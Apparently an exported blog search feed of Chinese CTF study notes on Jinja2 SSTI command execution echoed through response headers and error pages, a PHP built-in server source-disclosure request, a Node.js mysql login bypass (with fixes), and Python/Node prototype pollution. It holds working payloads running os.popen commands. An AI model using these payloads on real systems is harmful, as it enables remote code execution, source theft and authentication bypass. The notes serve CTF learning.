<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Jinjia2-SSTI请求头回显</title>
      <link href="/2025/04/29/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/"/>
      <url>/2025/04/29/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/</url>
      
        <content type="html"><![CDATA[<p>主要还是payload对于原理不进行过多描述</p><h1 id="Server回显"><a href="#Server回显" class="headerlink" title="Server回显"></a>Server回显</h1><p>一直听<font style="color:rgb(0, 0, 0);">Mash1r0.师傅讲请求头回显，第五届封神台也是碰到了能请求头回显的ssti，就来学习一下</font></p><p>这个利用方式比较新，据说只要是打jaijia2的ssti应该都能打。</p><p>我们先看看回包的结构：</p><p><img src="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745469263731-cc4b17de-49e1-40a5-a15f-80503c522f99.png"><br>注意这里的Serverr，Data回显,对于原出题人的说法是在flask中存在一个Server头：</p><p><img src="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/745470661475-190d97c2-baac-4dcc-9d22-1d6fda36904b.png"></p><p>然后这个sever头有两个部分server_version和sys_version：</p><p><img src="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745470686196-2d1e7446-111d-4606-83f4-dca594425120.png"></p><p>这两个值是WSGIRequestHandler类中的属性，这里可以更改环境中的server_version或者sys_version的值来获取回显。</p><p>中间的代码跟进不再演示</p><p>server_version调用的是WSGIRequestHandler类的server_version()方法：</p><p><img src="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745500454369-c17b9c1d-7df9-4c32-ba0e-badb996e3478.png"></p><p>利用点就是在这里，这里的方法为什么可以利用，重点在于它的@property装饰器，这个的介绍如下：</p><ul><li>这是一个装饰器，使用这个装饰器，可以将一个方法转换为属性，也就是说使用这个装饰器的方法，可以使其在访问时可以像访问属性一样，它把方法包装成属性，让方法可以以属性的形式被访问或调用。</li></ul><p>也就是说，这个方法其实就等同于下面这种调用：</p><p>self.server_version=self.server._server_version</p><p>所以可以直接给它赋str类型的值。后面再来根据过程来给出payload</p><p>现在已经知道了对象，那么怎么获取到对象呢，即怎么获取到werkzeug.serving.WSGIRequestHandler对象，在这里我们可以通过使利用sys模块来获取到相关对象，</p><p>就是通过sys模块来获取到相关类，在原型链污染中学习了如何获取到sys模块，所以payload如下：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样的还可以利用这个sys_version，只不过这里是直接调用的类的属性：</p><p>像server_version一样的“调用方法”。所以payload如下：</p><pre><code>{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}</code></pre><p>获取sys模块不只这种，同样的还存在于全局变量中，所以其实直接获取即可，如下payload：</p><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}</code></pre><p>参考文章的payload如下：</p><pre><code>{{g.pop.__globals__.__builtins__.setattr(g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",g.pop.__globals__.__builtins__.__import__('os').popen('whoami').read())}}</code></pre><h1 id="响应头扩展"><a href="#响应头扩展" class="headerlink" title="响应头扩展"></a>响应头扩展</h1><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"request_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}</code></pre><p>回显的HTTP/1.1，并且是str类型，所以应该是可以如下利用的：</p><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"protocol_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}</code></pre><h1 id="错误页面回显"><a href="#错误页面回显" class="headerlink" title="错误页面回显"></a>错误页面回显</h1><p>比如方法错误的回显，或者500页面的回显：</p><p>状态码回显</p><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.wrappers.Response,"default_status",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}</code></pre><p>改404页面的（先传payload再人为构造错误页面）：</p><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.NotFound,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}</code></pre><p>405的：</p><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.MethodNotAllowed,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}</code></pre><p>500的：</p><pre><code>{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.InternalServerError,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}</code></pre>]]></content>
      
      
      <categories>
          
          <category> ssti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP_=7.4.21 Development Server源码泄露漏洞</title>
      <link href="/2025/04/29/PHP_=7.4.21%20Development%20Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/29/PHP_=7.4.21%20Development%20Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>在复现第八届封神台ctf第一次接触到了<code>php -S服务启动后造成代码泄露</code>的漏洞</p><p>PHP从5.4开始，就提供了一个内置的web服务器，主要是用来做本地的开发用的。<br>前提：php已经加入到本地电脑的环境变量中</p><p>cd 项目目录</p><p>php -S localhost:8080  </p><p>通过<code>php -S</code>开起的内置WEB服务器存在源码泄露漏洞，可以将PHP文件作为静态文件直接输出源码  </p><p>随意访问一个不存在的php，触发以下页面，这算是php -S启动服务的一个标志：（页面来自封神台的图床题）</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745475646348-eadb9113-2888-4365-b623-c1760e25cf3e.png"></p><p>我们这里就结合这道题来介绍这个漏洞的利用</p><p>我们bp抓包发送repeater来准备读取unzip.php的源码，一定能要关闭repeater的自动更新Content-Length  以及显示回车换行，方便数据包的构造。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745476282943-e7089b83-167d-4ec0-a8bc-79671a3362f5.png"></p><p>这里就读取到了源码但是不在接着往下写，想往下看这题去看我的wp</p><p>这里先上poc并附上解释</p><pre class="line-numbers language-language-http"><code class="language-language-http">GET /unzip.php HTTP/1.1Host: 159.138.63.173:8085GET /AAA.txt Http/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> ps：这里一定要换行  </p><p>第一个GET后的/unzip.php是直接访问已存在的unzip.php文件</p><p>PHP源码中的php_cli_server_request_translate_vpath函数将请求的PHP文件的路径转换为文件系统上的</p><p>完整路径。</p><p>如果请求的文件是一个目录，它会检查是否存在索引文件，如index.php或 index.html，并使用其中一个文</p><p>件的路径(如果找到的话)。</p><p>第二个GET后的/请求的是目录而不是文件。</p><p>此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为PHP文件执行。</p><p>这是通过检查文件的扩展名来完成的。如果扩展不是.php或.PHP，或者如果扩展名的长度不等于3,则该文件被视为静态文件，</p><p><strong>因此如果我们把第二个GET请求的内容改为类似1.txt的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)</strong></p>]]></content>
      
      
      <categories>
          
          <category> php特性 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于nodejs mysql module导致的登陆漏洞</title>
      <link href="/2025/04/29/%E5%85%B3%E4%BA%8Enodejs%20mysql%20module%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/29/%E5%85%B3%E4%BA%8Enodejs%20mysql%20module%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>在复现第八届封神台CTF时碰到了一个这样的漏洞</p><p>这一题的描述如下</p><p>我可以很嚣张的告诉你：用户名是admin，后端用的是nodejs，我还用上了数据库，flag就放在后台 不需要任何扫描或爆破，请不要扫描和爆破，这没有意义</p><p> 部分代码：</p><pre class="line-numbers language-language-js"><code class="language-language-js">var mysql = require("mysql");if (username && password) {pool.query("SELECT * FROM accounts WHERE username = ? AND password = ?",<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 这里使用了参数化查询(?作为占位符)，这是防止SQL注入的好做法</p><p>但是 </p><p>我们现在将改变<code>password</code>参数到<code>password[password]</code>使参数为<code>Object</code>而不是<code>String</code>. </p><p>我们就可以访问管理员帐户</p><p> 或者也可以将数据作为 JSON 传递并绕过身份验证</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745563696799-2cdd5331-7ced-4369-8a76-83318b1849ff.png"></p><p> 这是由于某些类型(特别是对象类型)<strong>quoted identifiers</strong>在被转义函数转义时包含引用的标识符。引用的标识符用于指示数据库、表格、列或此类。有了这个,我们可以引用查询中的其他表或列。  </p><p>将<code>password = </code>obj_key_1<code> </code>更改为<code>password = </code>password``</p><p>自引用的标识符<code>password</code>被视为一列,它最终会成为<code>password = password</code></p><p>现在,如果我们改变<code>obj_val_1</code>为1,它最终将成为<code>(1=1)=1</code>最终返回1。</p><p>因此,当密码参数传递为<code>{'password': 1}</code>它最终会转化为``password<code>=1</code>最后绕过了身份验证逻辑。</p><p>所以在面对nodejs和mysql的登陆时我们可以<br>username[username]=1&amp;password[password]=1</p><p>来登录</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745564157565-c3c4074a-59f0-4837-ae77-33949227a7ab.png"></p><p>或者<br>username=admin&amp;password[password]=1</p><p>登录特定用户如admin</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52815563/1745564201946-966e24f7-d3c3-407c-899e-67cade203047.png"></p><p><strong>防御方法</strong></p><p>解决方法 1:在创建连接时添加 stringifyObjects 选项</p><p>添加<code>"stringifyObjects":true</code>调用时的选项<code>mysql.createConnection</code>最终会阻止所有意想不到的行为,当<code>Object</code>在参数中传递。</p><p>但是,这可能会影响项目中所有现有的查询,并且当某些查询实际通过时可能会引入另一个问题。<code>Object</code>参数。您可能还想查看变通方法2作为替代方案。</p><p>解决方法 2:添加类型检查</p><p>解决方法1可能是解决这个问题的最有效和最有效的方法。</p><p>然而,前一种解决方法只会阻止任何意想不到的行为。<code>Object</code>独家。其他类型如<code>Array</code>, 数组 of<code>Array</code>,<code>Boolean</code>仍然可能导致意想不到的问题,因为它仍然根据值类型以不同的方式逃逸。前一种解决方法在许多罕见情况下仍然会引入其他意想不到的行为。</p><p>因此,最好添加类型检查代码,使您的代码更加严格。这种解决方法的缺点是,添加类型检查代码并对项目进行维护可能需要花费大量时间和成本。此外,在编写代码时,您可能会错过类型检查。</p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python原型链污染</title>
      <link href="/2025/04/17/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2025/04/17/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h1><p><strong>直接污染static目录</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">data = {    "__init__":{        "__globals__":{                "app":{                        "_static_folder": "/"                    }            }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接把static污染成根目录，假设存在/flag的子网和/flag的文件存放flag就能直接下载flag</p><pre class="line-numbers language-language-python"><code class="language-language-python">{    "__init__": {        "__globals__": {                    "BLACKLIST_IN_index": ""            }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种攻击方式可以在Python中实现对类属性值的污染。需要注意的是，由于Python中的安全设定和部分特殊属性类型限定，并不是所有的类其所有的属性都是可以被污染的，不过可以肯定的，污染只对类的属性起作用，对于类方法是无效的。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="合并函数"><a href="#合并函数" class="headerlink" title="合并函数#"></a>合并函数<a href="https://www.cnblogs.com/Article-kelp/p/17068716.html#%E5%90%88%E5%B9%B6%E5%87%BD%E6%95%B0"><font style="color:#003884;">#</font></a></h2><p>Pydash模块中的<strong>set_和set_with</strong>函数具有如下实例中<strong>merge</strong>函数类似的类属性赋值逻辑，能够实现污染攻击需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下：</p><pre class="line-numbers language-language-python"><code class="language-language-python">def merge(src, dst):    # 遍历源字典 (src) 中的每一对键值对    for k, v in src.items():        # 检查目标对象 dst 是否是字典类型（具有 __getitem__ 方法）        if hasattr(dst, '__getitem__'):            # 如果目标字典中已经有这个键且对应的值是字典类型，则递归合并            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                # 否则直接将源字典中的值赋给目标字典的键                dst[k] = v        # 如果目标对象 dst 是具有指定属性的对象（通过 hasattr(dst, k) 判断）        # 并且源字典中的值是字典类型，则递归合并        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            # 否则将源字典的值赋给目标对象的属性            setattr(dst, k, v)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="污染示例-；"><a href="#污染示例-；" class="headerlink" title="污染示例 ；"></a>污染示例 ；</h2><p>由于Python中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以__开头的内置属性等</p><p>修改自定义属性示例</p><pre class="line-numbers language-language-python"><code class="language-language-python">class father:    secret = "haha"class son_a(father):    passclass son_b(father):    passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = son_b()payload = {    "__class__" : {        "__base__" : {            "secret" : "no way"        }    }}print(son_a.secret)#hahaprint(instance.secret)#hahamerge(payload, instance)print(son_a.secret)#no wayprint(instance.secret)#no way（关注值的更改和污染方式）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="object无法污染"><a href="#object无法污染" class="headerlink" title="object无法污染"></a>object无法污染</h2><p>正如前面所述，并不是所有的类的属性都可以被污染，如<strong>Object的属性就无法被污染</strong>，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p><pre class="line-numbers language-language-python"><code class="language-language-python">def merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)payload = {    "__class__" : {            "__str__" : "Polluted ~"        }    }merge(payload, object)#TypeError: can't set attributes of built-in/extension type 'object'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在上边的介绍中污染类属性是<strong>通过示例的__base__属性查找到其继承的父类</strong>，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力</p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>在Python中，函数或类方法（对于类的内置方法如__init__这些来说，内置方法在并未重写时其数据类型为装饰器即wrapper_descriptor，只有在重写后才是函数function）均具有一个__globals__属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的globals函数的返回值）</p><p>也就是说里面有所有的类与属性</p><p>污染示例（注意类内变量修改和类外的区别）</p><pre class="line-numbers language-language-python"><code class="language-language-python">secret_var = 114def test():    passclass a:    secret_class_var = "secret"class b:    def __init__(self):        passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = b()payload = {    "__init__" : {            "__globals__" : {                "secret_var" : 514,                "a" : {                    "secret_class_var" : "Pooooluted ~"                }            }        }    }print(a.secret_class_var)#secretprint(secret_var)#114merge(payload, instance)print(a.secret_class_var)#Pooooluted ~print(secret_var)#514<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="已加载模块"><a href="#已加载模块" class="headerlink" title="已加载模块"></a>已加载模块</h3><p>需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了—也就是说需要污染的在我们操作的下文</p><p>简单的示例</p><pre class="line-numbers language-language-python"><code class="language-language-python">#test.pyimport test_1class cls:    def __init__(self):        passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = cls()payload = {    "__init__" : {        "__globals__" : {            "test_1" : {                "secret_var" : 514,                "target_class" : {                    "secret_class_var" : "Poluuuuuuted ~"                }            }        }    }}print(test_1.secret_var)#secretprint(test_1.target_class.secret_class_var)#114merge(payload, instance)print(test_1.secret_var)#514print(test_1.target_class.secret_class_var)#Poluuuuuuted secret_var = 114class target_class:    secret_class_var = "secret"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们更改的secret_var等都在污染之后</p><p>在加载关系简单的情况下，我们可以直接从文件的_<strong>import语法部分</strong>_找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块</p><p>但是实际上带都是没法直接这么简单的直接查看的，我们就需要利用sys模块</p><h4 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h4><p>sys模块的modules属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p><p><em>也就是说勉强算是利用globals的进阶版，这里只上payload了</em></p><pre class="line-numbers language-language-python"><code class="language-language-python">payload = {    "__init__" : {        "__globals__" : {            "sys" : {                "modules" : {                    "test_1" : {                        "secret_var" : 514,                        "target_class" : {                            "secret_class_var" : "Poluuuuuuted ~"                        }                    }                }            }        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然我们去使用的Payload绝大部分情况下是不会这样的，如上的</p><p>上边的Payload是在已经import sys的情况下使用的，而大部分情况是没有直接导入的，上述只是为了引出下文的真正的复杂的使用</p><h4 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h4><p>这样问题就从<strong>寻找import特定模块的语句</strong>转换为**寻找import了sys模块的语句，**为了进一步简化问题，这里采用方式是利用Python中加载器loader</p><p>加载器loader</p><p>是为实现模块加载而设计的类，其在importlib这一内置模块中有具体实现</p><p>关键是—-importlib模块下所有的py文件中均引入了sys模块</p><p>只要我们能过获取到一个loader便能用如loader.<strong>init</strong>.<strong>globals</strong>[‘sys’]的方式拿到sys模块，这样进而获取目标模块。</p><p>并且对于一个模块来说，模块中的一些<strong>内置属性会在被加载时自动填充</strong></p><p>__loader__内置属性会被赋值为加载该模块的loader，这样只要能获取到任意的模块便能通过__loader__属性获取到loader，而且对于python3来说除了在debug模式下的主文件中__loader__为None以外，正常执行的情况每个模块__loader__属性均有一个对应的类</p><h4 id="spec"><a href="#spec" class="headerlink" title="spec"></a><strong>spec</strong></h4><p>__spec__内置属性在Python 3.4版本引入，其包含了关于类加载时的信息，本是定义在Lib/importlib/_bootstrap.py的类ModuleSpec，显然因为定义在importlib模块下的py文件，所以可以直接采用</p><p>&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]获取到sys模块</p><h4 id="ModuleSpec"><a href="#ModuleSpec" class="headerlink" title="ModuleSpec"></a>ModuleSpec</h4><p>由于ModuleSpec的属性值设置，相对于上面的获取方式，还有一种相对长的</p><p>payload的获取方式，主要是利用ModuleSpec中的loader属性。如属性名所示，该属性的值是模块加载时所用的loader所以有这样的相对长的</p><p>Payload：</p><p>&lt;模块名&gt;.<strong>spec</strong>.loader.<strong>init</strong>.<strong>globals</strong>[‘sys’]</p><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a><strong>函数形参默认值替换</strong></h3><p>函数的__defaults__和__kwdefaults__这两个内置属性（分别获取位置或关键字参数，关键字参数）</p><p>这里需要了解了解什么是位置或关键字参数和关键字参数</p><p>即—-def name(p1, p2, /, p_or_kw, *, kw):</p><p>为了便于理解给出实验示例</p><pre class="line-numbers language-language-python"><code class="language-language-python">def func_a(var_1, var_2 =2, var_3 = 3):    passdef func_b(var_1, /, var_2 =2, var_3 = 3):    pass    def func_c(var_1, var_2 =2, *, var_3 = 3):    passdef func_d(var_1, /, var_2 =2, *, var_3 = 3):    passprint(func_a.__defaults__)#(2, 3)print(func_b.__defaults__)#(2, 3)print(func_c.__defaults__)#(2,)print(func_d.__defaults__)#(2,)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如JSON等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式</p><p>污染示例</p><pre class="line-numbers language-language-python"><code class="language-language-python">def evilFunc(arg_1 , shell = False):    if not shell:        print(arg_1)    else:        print(__import__("os").popen(arg_1).read())class cls:    def __init__(self):        passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = cls()payload = {    "__init__" : {        "__globals__" : {            "evilFunc" : {                "__defaults__" : (                    True ,                )            }        }    }}evilFunc("whoami")#whoamimerge(payload, instance)evilFunc("whoami")#article-kelp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kw</p><pre class="line-numbers language-language-python"><code class="language-language-python">def evilFunc(arg_1 , * , shell = False):    if not shell:        print(arg_1)    else:        print(__import__("os").popen(arg_1).read())class cls:    def __init__(self):        passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = cls()payload = {    "__init__" : {        "__globals__" : {            "evilFunc" : {                "__kwdefaults__" : {                    "shell" : True                }            }        }    }}evilFunc("whoami")#whoamimerge(payload, instance)evilFunc("whoami")#article-kelp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 原型链污染 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs原型链污染</title>
      <link href="/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>constructor.prototype</strong>可以代替**<strong>proto</strong>**</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h5 id="Nodejs和JavaScipt和JSON的区别"><a href="#Nodejs和JavaScipt和JSON的区别" class="headerlink" title="Nodejs和JavaScipt和JSON的区别"></a>Nodejs和JavaScipt和JSON的区别</h5><p>先来了解一下<strong>Nodejs和JavaScipt和JSON的区别</strong>吧，一直也是懵懵懂懂</p><p>如果没有node，那么我们的JavaScript代码则由浏览器中的<strong>JavaScript解析器</strong>进行解析。几乎所有的浏览器都配备了JavaScript的解析功能（最出名的就是google的v8）， 这也是为什么我们能在f12中直接执行JavaScript的原因</p><p>而Nodejs则是由这个解析器单独从浏览器中拿出来，并进行了一系列的处理，最后成为了一个可以在服务端运行JavaScript的环境</p><p>JSON是JavaScript的对象表示方法，它表示的是声明对象的一种格式， 由于我们从前端接收到的数据基本都是字符串，因此在服务端如果要将这些字符串处理为其他格式，比如对象，就需要用到JSON了。</p><p>接着便是引入我们的nodejs原型链污染的知识了</p><h5 id="原型对象（prototype）与原型连接点（proto）与原型链"><a href="#原型对象（prototype）与原型连接点（proto）与原型链" class="headerlink" title="原型对象（prototype）与原型连接点（proto）与原型链"></a>原型对象（prototype）与原型连接点（<strong>proto</strong>）与原型链</h5><p>在c++或java这些面向对象的语言中，我们如果想要一个对象，首先需要使用关键字class声明一个类，再使用关键字new一个对象出来(经常书写的php也是这样)，但是在JavaScript中没有class以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了class语法，但class其实只是一个语法糖）。 在JavaScript有这么两种声明对象的方式</p><p><strong>直接实例化构造方法Object()来创建对象</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">person=new Object()person.firstname="John";person.lastname="Doe";person.age=50;person.eyecolor="blue";这种创建对象的方法还有另一种写法 如下person={firstname:"John",lastname:"Doe",age:50,eyecolor:"blue"};这种方法通过直接实例化构造方法Object()来创建对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>先创建构造函数 再实例化构造函数</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">function person(firstname,lastname,age,eyecolor)  这里创建了一个“类” 但是在JavaScript中叫做构造函数或者构造器{    this.firstname=firstname;    this.lastname=lastname;    this.age=age;    this.eyecolor=eyecolor;}var myFather=new person("John","Doe",50,"blue");    通过这个“类”实例化对象var myMother=new person("Sally","Rally",48,"green");这种方法先创建构造函数 再实例化构造函数 